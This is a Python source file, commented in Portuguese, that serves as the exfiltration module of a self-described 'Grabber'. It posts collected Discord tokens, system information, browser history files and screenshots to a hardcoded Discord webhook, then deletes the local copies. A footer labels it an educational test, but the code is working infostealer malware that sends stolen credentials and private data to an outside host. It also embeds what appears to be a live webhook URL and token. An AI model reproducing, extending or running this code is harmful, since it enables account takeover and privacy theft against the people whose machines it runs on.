import requests
import os
import base64
import io

# URL do webhook embutida no código
WEBHOOK_URL = "https://discord.com/api/webhooks/1365120308821885029/F5FfRNhZpb5TfNJWith2gPTSMqzmDMXIlnpYKH_Az_7WDA_NAVlgGjKjYKwcxS20IixO"  # Substitua pela URL real do seu webhook

def send_to_discord(data):
    """Enviar dados para o webhook do Discord."""
    if not WEBHOOK_URL:
        print("[ERRO] URL do webhook não configurada.")
        return
    
    system_info = data.get("system_info", {})
    tokens = data.get("discord_token", ["Nenhum token coletado"])
    history_file = data.get("browser_history", "Nenhum histórico coletado")
    screenshot = data.get("screenshot")
    
    # Criar embed com informações
    embed = {
        "title": "Grabber Teste - Dados Coletados",
        "color": 0xFF0000,
        "fields": [],
        "footer": {"text": "Teste educacional - Uso controlado"}
    }
    
    if system_info:
        embed["fields"].append({
            "name": "Informações do Sistema",
            "value": "\n".join([f"{k}: {v}" for k, v in system_info.items()]),
            "inline": False
        })
    
    if tokens:
        embed["fields"].append({
            "name": "Tokens do Discord",
            "value": "\n".join(tokens),
            "inline": False
        })
    
    # Preparar dados para envio
    discord_data = {"embeds": [embed]}
    
    try:
        # Enviar texto
        response = requests.post(WEBHOOK_URL, json=discord_data)
        if response.status_code != 204:
            print(f"[ERRO] Erro ao enviar texto: {response.status_code} - {response.text}")
        else:
            print("[INFO] Texto enviado com sucesso ao Discord.")
        
        # Enviar histórico do navegador como arquivo .txt (se existir)
        if isinstance(history_file, str) and os.path.exists(history_file):
            print(f"[INFO] Enviando histórico do navegador como arquivo: {history_file}")
            with open(history_file, "rb") as f:
                files = {"file": ("browser_history.txt", f, "text/plain")}
                response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 204:
                print("[INFO] Histórico do navegador enviado com sucesso ao Discord!")
            else:
                print(f"[ERRO] Erro ao enviar histórico: {response.status_code} - {response.text}")
            # Deletar o arquivo após envio
            try:
                os.remove(history_file)
                print(f"[INFO] Arquivo {history_file} deletado após envio.")
            except Exception as e:
                print(f"[AVISO] Falha ao deletar {history_file}: {e}")
        else:
            print("[AVISO] Nenhum arquivo de histórico para enviar.")
        
        # Enviar screenshot (se houver)
        if screenshot:
            print("[INFO] Enviando screenshot...")
            if isinstance(screenshot, str) and os.path.exists(screenshot):
                with open(screenshot, "rb") as f:
                    files = {"file": ("screenshot.png", f, "image/png")}
                    response = requests.post(WEBHOOK_URL, files=files)
                os.remove(screenshot)  # Deletar arquivo local após envio
            else:
                screenshot_bytes = base64.b64decode(screenshot)
                files = {"file": ("screenshot.png", io.BytesIO(screenshot_bytes), "image/png")}
                response = requests.post(WEBHOOK_URL, files=files)
            
            if response.status_code == 204:
                print("[INFO] Screenshot enviado com sucesso ao Discord!")
            else:
                print(f"[ERRO] Erro ao enviar screenshot: {response.status_code} - {response.text}")
        
    except requests.exceptions.RequestException as e:
        print(f"[ERRO] Erro ao enviar para o webhook: {e}")